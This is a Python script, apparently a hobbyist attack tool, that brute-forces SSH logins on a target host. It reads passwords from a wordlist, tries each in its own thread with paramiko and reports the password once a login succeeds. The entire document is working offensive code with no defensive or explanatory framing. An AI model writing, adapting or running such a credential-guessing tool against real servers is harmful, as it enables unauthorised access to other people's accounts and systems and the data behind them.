import paramiko, sys, socket, termcolor, os
import threading, time



stop_flag=0


def ssh_connect(password, code=0):
	global stop_flag
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
		stop_flag=1
		print(termcolor.colored(('[+] Found password: ' + password + ' for account: '+ username),'green'))
	except:
		print(termcolor.colored(('[+] Incorrect login: ' + password),'red'))
	ssh.close()
	

host = input ('[+] Target address : ')
username = input('[+] SSH username : ')
input_file = input('[+] Password file: ')
print('\n')

if os.path.exists(input_file) == False:
	print('[!!] File not exists')
	sys.exit(1)

print('*** Starting threaded SSH bruteforce on: '+ termcolor.colored((host),'green') + ' with account '+ username+'***')


with open(input_file, 'r') as file:
	for line in file.readlines():
		if stop_flag ==1:
			t.join()
			exit()
		password = line.strip()
		t=threading.Thread(target=ssh_connect, args=(password,))
		t.start()
		time.sleep(0.5)